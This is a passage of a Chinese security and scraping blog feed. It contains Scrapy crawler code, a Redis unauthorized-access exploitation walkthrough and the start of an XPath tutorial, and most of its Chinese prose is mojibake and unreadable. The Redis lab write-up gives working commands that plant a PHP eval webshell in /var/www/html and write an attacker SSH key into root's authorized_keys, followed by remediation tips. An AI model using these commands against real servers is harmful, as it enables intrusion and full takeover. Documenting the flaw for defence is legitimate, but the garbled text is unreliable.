class="hljs-title">WebcrawlerScrapyPipeline</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">       ä¿å­˜åˆ°æ•°æ®åº“ä¸­å¯¹åº”çš„class</span><span class="hljs-string">       1ã€åœ¨settings.pyæ–‡ä»¶ä¸­é…ç½®</span><span class="hljs-string">       2ã€åœ¨è‡ªå·±å®ç°çš„çˆ¬è™«ç±»ä¸­yield item,ä¼šè‡ªåŠ¨æ‰§è¡Œ</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, dbpool</span>):</span>        self.dbpool = dbpool  <span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡</span>        <span class="hljs-string">&#x27;&#x27;&#x27; è¿™é‡Œæ³¨é‡Šä¸­é‡‡ç”¨å†™æ­»åœ¨ä»£ç ä¸­çš„æ–¹å¼è¿æ¥çº¿ç¨‹æ± ï¼Œå¯ä»¥ä»settingsé…ç½®æ–‡ä»¶ä¸­è¯»å–ï¼Œæ›´åŠ çµæ´»</span><span class="hljs-string">            self.dbpool=adbapi.ConnectionPool(&#x27;MySQLdb&#x27;,</span><span class="hljs-string">                                          host=&#x27;127.0.0.1&#x27;,</span><span class="hljs-string">                                          db=&#x27;crawlpicturesdb&#x27;,</span><span class="hljs-string">                                          user=&#x27;root&#x27;,</span><span class="hljs-string">                                          passwd=&#x27;123456&#x27;,</span><span class="hljs-string">                                          cursorclass=MySQLdb.cursors.DictCursor,</span><span class="hljs-string">                                          charset=&#x27;utf8&#x27;,</span><span class="hljs-string">                                          use_unicode=False)</span><span class="hljs-string">        &#x27;&#x27;&#x27;</span><span class="hljs-meta">    @classmethod</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_settings</span>(<span class="hljs-params">cls, settings</span>):</span>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">           1ã€@classmethodå£°æ˜ä¸€ä¸ªç±»æ–¹æ³•ï¼Œè€Œå¯¹äºå¹³å¸¸æˆ‘ä»¬è§åˆ°çš„åˆ™å«åšå®ä¾‹æ–¹æ³•ã€‚</span><span class="hljs-string">           2ã€ç±»æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°clsï¼ˆclassçš„ç¼©å†™ï¼ŒæŒ‡è¿™ä¸ªç±»æœ¬èº«ï¼‰ï¼Œè€Œå®ä¾‹æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯selfï¼Œè¡¨ç¤ºè¯¥ç±»çš„ä¸€ä¸ªå®ä¾‹</span><span class="hljs-string">           3ã€å¯ä»¥é€šè¿‡ç±»æ¥è°ƒç”¨ï¼Œå°±åƒC.f()ï¼Œç›¸å½“äºjavaä¸­çš„é™æ€æ–¹æ³•</span><span class="hljs-string">        &#x27;&#x27;&#x27;</span>        dbparams = <span class="hljs-built_in">dict</span>(            host=settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>],  <span class="hljs-comment"># è¯»å–settingsä¸­çš„é…ç½®</span>            db=settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>],            user=settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>],            passwd=settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>],            charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,               <span class="hljs-comment"># ç¼–ç è¦åŠ ä¸Šï¼Œå¦åˆ™å¯èƒ½å‡ºç°ä¸­æ–‡ä¹±ç é—®é¢˜</span>            cursorclass=pymysql.cursors.DictCursor,            use_unicode=<span class="hljs-literal">False</span>,        )        dbpool = adbapi.ConnectionPool(<span class="hljs-string">&#x27;pymysql&#x27;</span>, **dbparams)  <span class="hljs-comment"># **è¡¨ç¤ºå°†å­—å…¸æ‰©å±•ä¸ºå…³é”®å­—å‚æ•°,ç›¸å½“äºhost=xxx,db=yyy....</span>        <span class="hljs-keyword">return</span> cls(dbpool)                                     <span class="hljs-comment"># ç›¸å½“äºdbpoolä»˜ç»™äº†è¿™ä¸ªç±»ï¼Œselfä¸­å¯ä»¥å¾—åˆ°</span>    <span class="hljs-comment"># pipelineé»˜è®¤è°ƒç”¨</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span>        query = self.dbpool.runInteraction(self._conditional_insert, item)  <span class="hljs-comment"># è°ƒç”¨æ’å…¥çš„æ–¹æ³•</span>        query.addErrback(self._handle_error, item, spider)                  <span class="hljs-comment"># è°ƒç”¨å¼‚å¸¸å¤„ç†æ–¹æ³•</span>        <span class="hljs-keyword">return</span> item    <span class="hljs-comment"># å†™å…¥æ•°æ®åº“ä¸­</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_conditional_insert</span>(<span class="hljs-params">self, tx, item</span>):</span>        <span class="hljs-comment"># print (item[&#x27;word&#x27;])</span>        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>        params = (item[<span class="hljs-string">&quot;word&quot;</span>], item[<span class="hljs-string">&quot;soundmark&quot;</span>], item[<span class="hljs-string">&quot;url&quot;</span>], item[<span class="hljs-string">&quot;translation&quot;</span>])        tx.execute(sql, params)    <span class="hljs-comment"># é”™è¯¯å¤„ç†æ–¹æ³•</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_handle_error</span>(<span class="hljs-params">self, failue, item, spider</span>):</span>        print(<span class="hljs-string">&#x27;--------------database operation exception!!-----------------&#x27;</span>)        print(<span class="hljs-string">&#x27;-------------------------------------------------------------&#x27;</span>)        print(failue)</code></pre><p>pipelinesä¸­å†™äº†ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯å°†å•è¯çš„ç›¸å…³æ€§ä¿¡æ¯å†™å…¥åˆ°æ•°æ®åº“ï¼Œå¦ä¸€ä¸ªæ˜¯å°†å•è¯ä¿¡æ¯ä¿å­˜åˆ°ä¸€ä¸ªjsonæ–‡ä»¶ä¸­</p><h2 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h2><p>è¿è¡Œæˆªå›¾</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221134698.png" alt="image-20210502221134698"></p><p>jsonæ–‡ä»¶æˆªå›¾</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221223747.png" alt="image-20210502221223747"></p><p>ä¸‹è½½çš„éŸ³é¢‘</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221344459.png" alt="image-20210502221344459" style="zoom:67%;"><p>æ•°æ®åº“å†…å®¹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221904968.png" alt="image-20210502221904968"></p><h1 id="çˆ¬å–å£çº¸çš„çˆ¬è™«"><a href="#çˆ¬å–å£çº¸çš„çˆ¬è™«" class="headerlink" title="çˆ¬å–å£çº¸çš„çˆ¬è™«"></a>çˆ¬å–å£çº¸çš„çˆ¬è™«</h1><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<span class="hljs-keyword">import</span> pymysql<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">from</span> word.items <span class="hljs-keyword">import</span> WordItem<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpiderPicSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>    name = <span class="hljs-string">&#x27;spider_pic&#x27;</span>    allowed_domains = [<span class="hljs-string">&#x27;desk.zol.com.cn&#x27;</span>] <span class="hljs-comment"># çˆ¬è™«æœç´¢çš„åŸŸåèŒƒå›´</span>    first_url = <span class="hljs-string">&quot;http://desk.zol.com.cn/meinv/1920x1080/&#123;0&#125;.html&quot;</span>    start_urls = [first_url.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)] <span class="hljs-comment"># çˆ¬è™«å¼€å§‹çš„url</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            url = self.first_url.<span class="hljs-built_in">format</span>(i)            <span class="hljs-keyword">yield</span> Request(                url=url,                callback=self.parse_one            )    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_one</span>(<span class="hljs-params">self, response</span>):</span>        se = Selector(response)  <span class="hljs-comment"># åˆ›å»ºæŸ¥è¯¢å¯¹è±¡</span>        <span class="hljs-keyword">if</span> (re.match(<span class="hljs-string">&quot;https://desk.zol.com.cn/meinv/\d+x\d+/\d+.html&quot;</span>, response.url)):            <span class="hljs-comment"># æ­£åˆ™æ˜¯åˆ¤æ–­æ”¹urlæ˜¯å¦æ­£ç¡®</span>            src = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li&quot;</span>)  <span class="hljs-comment"># ä½¿ç”¨xpathæ‰¾åˆ°æ‰€æœ‰å›¾ç‰‡æ‰€åœ¨çš„èŠ‚ç‚¹</span>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(src)):                imgURLs = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@src&quot;</span> % i).extract()  <span class="hljs-comment"># æå–èŠ‚ç‚¹ä¿¡æ¯</span>                title = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@title&quot;</span> % i).extract()                <span class="hljs-keyword">if</span> imgURLs:                    <span class="hljs-comment"># æ›¿æ¢urlä¸­çš„å°ºå¯¸ä¿¡æ¯ å¯ä»¥ä¸‹è½½æ›´å¤§çš„å›¾ç‰‡</span>                    realURL = imgURLs[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;t_s208x130c5&quot;</span>, <span class="hljs-string">&quot;t_s2560x1600c5&quot;</span>)                    file_name = <span class="hljs-string">u&quot;%s.jpg&quot;</span> % title[<span class="hljs-number">0</span>]                    path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\pic\meinv&quot;</span>, file_name)  <span class="hljs-comment"># æ‹¼æ¥å›¾ç‰‡çš„è·¯å¾„</span>                    <span class="hljs-built_in">type</span> = sys.getfilesystemencoding()                    print(file_name.encode(<span class="hljs-built_in">type</span>))                    item = WordItem()                    item[<span class="hljs-string">&#x27;name&#x27;</span>] = file_name                    item[<span class="hljs-string">&#x27;url&#x27;</span>] = realURL                    <span class="hljs-comment"># print(item[&#x27;name&#x27;],item[&#x27;url&#x27;])</span>                    <span class="hljs-keyword">yield</span> item                    urllib.request.urlretrieve(realURL, path)  <span class="hljs-comment"># æ¥æ”¶æ–‡ä»¶è·¯å¾„å’Œéœ€è¦ä¿å­˜çš„è·¯å¾„ï¼Œä¼šè‡ªåŠ¨å»æ–‡ä»¶è·¯å¾„ä¸‹è½½å¹¶ä¿å­˜åˆ°æˆ‘ä»¬æŒ‡å®šçš„æœ¬åœ°è·¯å¾„</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223115320.png" alt="image-20210502223115320"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223132992.png" alt="image-20210502223132992"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>redis</title>
    <link href="/2021/04/14/redis/"/>
    <url>/2021/04/14/redis/</url>
    
    <content type="html"><![CDATA[<h1 id="redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°"><a href="#redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°" class="headerlink" title="redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°"></a>redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°</h1><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>Rediså› é…ç½®ä¸å½“å°±ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisä¼šç»‘å®šåœ¨ 0.0.0.0:6379ã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ · Redis æœåŠ¡ç›´æ¥æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®åˆ°ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ Redis è‡ªèº«æä¾›çš„config å‘½ä»¤è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>è¯¥æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>1.redisç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼›<br>2.æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç (è®¤è¯)è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚</p><p>æ¼æ´å±å®³ï¼š<br>(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ï¼›<br>(2) æ”»å‡»è€…å¯é€šè¿‡æ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶ï¼›<br>(3) æœ€ä¸¥é‡çš„æƒ…å†µï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨;</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>åœ¨kaliä¸­å®‰è£…redis 3.2.0</p><pre><code class="hljs awk">åˆ›å»ºrediså®‰è£…ç›®å½•mkdir <span class="hljs-regexp">/usr/</span>local/rediscd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz<span class="hljs-regexp">//</span>è·å–rediså‹ç¼©åŒ…tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gzcd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>make <span class="hljs-comment">#ç¼–è¯‘å®‰è£…</span></code></pre><p>å®‰è£…å®Œæˆä¹‹åéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé…ç½®å…è®¸å¯ä»¥è¿œç¨‹è®¿é—®ã€‚</p><p>vim redis.conf #ä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶</p><p>åœ¨bind 127.0.0.1å‰é¢åŠ ä¸Š#å·è¿›è¡Œæ³¨é‡Šï¼Œå¹¶å°†protected-modeè®¾ç½®ä¸ºnoã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387"></p><p>ç„¶åè¿›å…¥srcç›®å½•ï¼Œå°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰ï¼Œå¹¶å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹ã€‚</p><pre><code class="hljs awk">cd srccp redis-cli <span class="hljs-regexp">/usr/</span>bincp redis-server <span class="hljs-regexp">/usr/</span>bincp redis.conf <span class="hljs-regexp">/etc/</span></code></pre><p>å¼€å¯redisæœåŠ¡</p><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311"></p><p>ç¬¬ä¸€å°ä½œä¸ºæ”»å‡»æœºå³å¯ï¼Œç„¶åå°†è¿™å°ä¸»æœºå…‹éš†ä½œä¸ºç›®æ ‡ä¸»æœº</p><p>æ”»å‡»æœº</p><p>ip:192.168.164.145</p><p>ç›®æ ‡ä¸»æœº</p><p>ip:192.168.164.23</p><p>é¦–å…ˆç¡®å®šç›®æ ‡ä¸»æœºæ˜¯å¦å¼€å¯redisæœåŠ¡ï¼Œä½¿ç”¨nmapæ‰«æç«¯å£6379</p><p>å¦‚ä¸‹ï¼Œæ˜¾ç¤ºäº†ç›®æ ‡ä½¿ç”¨çš„redisç‰ˆæœ¬ä»¥åŠæœåŠ¡å™¨çš„ä¿¡æ¯</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841"></p><p>å¼€å§‹åˆ©ç”¨</p><h2 id="1-å†™å…¥æœ¨é©¬æ–‡ä»¶"><a href="#1-å†™å…¥æœ¨é©¬æ–‡ä»¶" class="headerlink" title="1.å†™å…¥æœ¨é©¬æ–‡ä»¶"></a>1.å†™å…¥æœ¨é©¬æ–‡ä»¶</h2><p>é¦–å…ˆè¿›å…¥rediså®‰è£…ç›®å½•çš„srcä¸­æ‰§è¡Œ</p><pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre><p>æˆåŠŸæ§åˆ¶ç›®æ ‡çš„redisæœåŠ¡</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p><p>å‘å…¶ç½‘ç«™æ ¹ç›®å½•ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span><span class="xml">config set dbfilename shell.php</span><span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span><span class="xml">save </span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p><p>saveæˆåŠŸåï¼Œç›®æ ‡ä¸»æœºçš„ç½‘ç«™æ ¹ç›®å½•å°±å‡ºç°äº†æœ¨é©¬æ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612"></p><h2 id="2-å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†"><a href="#2-å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†" class="headerlink" title="2.å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†"></a>2.å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†</h2><p>å†™å…¥sshå…¬é’¥åå¯ä»¥åœ¨æœ¬æœºå­˜å‚¨å¯¹åº”çš„sshå¯†é’¥ï¼Œç„¶åç›´æ¥æ— å¯†ç ç™»é™†ã€‚</p><p>é¦–å…ˆç”Ÿæˆå…¬é’¥å¯†é’¥æ–‡ä»¶</p><pre><code class="hljs awk">ssh-keygen -t rsacat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830"></p><p>ç»§ç»­ä½¿ç”¨å‘½ä»¤</p><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>config <span class="hljs-keyword">set</span> authorized_keys<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pubçš„å†…å®¹<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>save</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309"></p><p>ä½¿ç”¨å…¬é’¥è¿æ¥</p><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre><p>è¿™é‡Œçš„id_rsaä¸åˆ›å»ºsshå¯†é’¥è¾“å…¥çš„å†…å®¹ä¸€è‡´</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p><h2 id="3-åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#3-åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="3.åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>3.åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell</h2><p>åªèƒ½åœ¨centosç¯å¢ƒä¸­åˆ©ç”¨å› ä¸ºcentosç¯å¢ƒä¸­çš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶å¯ä»¥å¿½ç•¥ä¹±ç ï¼Œubuntuç¯å¢ƒå› ä¸ºæ— æ³•å¿½ç•¥æ–‡ä»¶ä¸­çš„ä¹±ç å› æ­¤æ— æ³•ä½¿ç”¨</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ã€é™åˆ¶ç™»å½•ip<br>åœ¨redis.confæ–‡ä»¶ä¸­è®¾ç½®redisè®¿é—®çš„ipç™½åå•ï¼Œå¦‚æœé¡¹ç›®å…è®¸çš„è¯æœ€å¥½è®¾ç½®ä¸ºåªå…è®¸æœ¬åœ°è®¿é—®ã€‚</p><p>2ã€æ·»åŠ å¯†ç <br>åœ¨redis.confé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°requirepasså¹¶å»æ‰å‰é¢çš„#ï¼Œ ç„¶ååœ¨åé¢è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ã€‚å› ä¸ºrediséªŒè¯å¯†ç çš„é€Ÿåº¦å¾ˆå¿«ï¼Œç»™æ”»å‡»è€…è¿›è¡Œé«˜é€Ÿçš„çˆ†ç ´å¯†ç æä¾›äº†ä¸€ä¸ªè‰¯å¥½çš„åŸºç¡€ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ä¸ä»…è§£å†³äº†æœªæˆæƒçš„é—®é¢˜è¿˜èƒ½é˜²æ­¢å¯†ç çˆ†ç ´ã€‚</p><p>3ã€ä¿®æ”¹é»˜è®¤ç«¯å£</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>scrapy</title>
    <link href="/2021/03/31/scrapy/"/>
    <url>/2021/03/31/scrapy/</url>
    
    <content type="html"><![CDATA[<h1 id="å­¦ä¹ åˆ†å¸ƒå¼çˆ¬è™«ç¬¬ä¸€å¤©"><a href="#å­¦ä¹ åˆ†å¸ƒå¼çˆ¬è™«ç¬¬ä¸€å¤©" class="headerlink" title="å­¦ä¹ åˆ†å¸ƒå¼çˆ¬è™«ç¬¬ä¸€å¤©"></a>å­¦ä¹ åˆ†å¸ƒå¼çˆ¬è™«ç¬¬ä¸€å¤©</h1><h2 id="xpathç¼–å†™"><a href="#xpathç¼–å†™" class="headerlink" title="xpathç¼–å†™"></a>xpathç¼–å†™</h2><p>xpathå­¦ä¹ ï¼Œè°·æ­Œå•†åº—ä¸‹è½½<code>xpath helper</code>ï¼Œå¯ä»¥å¤§å¤§æé«˜æ•ˆç‡</p><p>jdä¹Ÿä¹°ä½ è·å–ä»Šæ—¥ç§’æ€çš„å•†å“ä¿¡æ¯</p><pre><code class="hljs css">//<span class="hljs-selector-tag">div</span><span class="hljs-selector-attr">[@class=<span class="hljs-string">&quot;slider_wrapper&quot;</span>]</span>/<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[position()&lt;5]</span><span class="hljs-selector-attr">[@title]</span></code></pre><pre><code class="hljs dns">ä¸‰æ˜ŸGalaxy Note20 Ultra <span class="hljs-number">5</span>G(SM-N9860)S Pen&amp;ä¸‰æ˜Ÿç¬”è®° <span class="hljs-number">120</span>Hzè‡ªé€‚åº”å±å¹• <span class="hljs-number">5</span>Gæ‰‹æœº æ¸¸æˆæ‰‹æœº <span class="hljs-number">12</span>GB+<span class="hljs-number">512</span>GB è¿·é›¾é‡‘Â¥<span class="hljs-number">9899</span>.<span class="hljs-number">00Â¥9999.00</span>æ¸…é£æŠ½çº¸çº¸å·¾æ•´ç®±<span class="hljs-number">24</span>åŒ…é‡‘è£…åŸæœ¨<span class="hljs-number">3</span>å±‚<span class="hljs-number">130</span>æŠ½å©´å„¿é€‚ç”¨å«ç”Ÿçº¸é¤å·¾çº¸æŠ½Â¥<span class="hljs-number">57.90Â¥169.00</span>vivo Y3s <span class="hljs-number">5000m</span>Ahå¤§ç”µæ± é•¿ç»­èˆª <span class="hljs-number">128</span>GBå¤§å†…å­˜ AIæ™ºæ…§æ‘„å½± å…¨ç½‘é€šæ–°å“æ‰‹æœº æµ·é£é’ <span class="hljs-number">4</span>GB+<span class="hljs-number">64</span>GBÂ¥<span class="hljs-number">999</span>.<span class="hljs-number">00Â¥1098.00</span></code></pre><h2 id="ä¸€äº›tip"><a href="#ä¸€äº›tip" class="headerlink" title="ä¸€äº›tip"></a>ä¸€äº›tip</h2><ul><li>å…³é—­é…ç½®ä¿¡æ¯æ˜¾ç¤º</li></ul><p>åœ¨setting.pyæ·»åŠ <code>LOG_LEVEL = 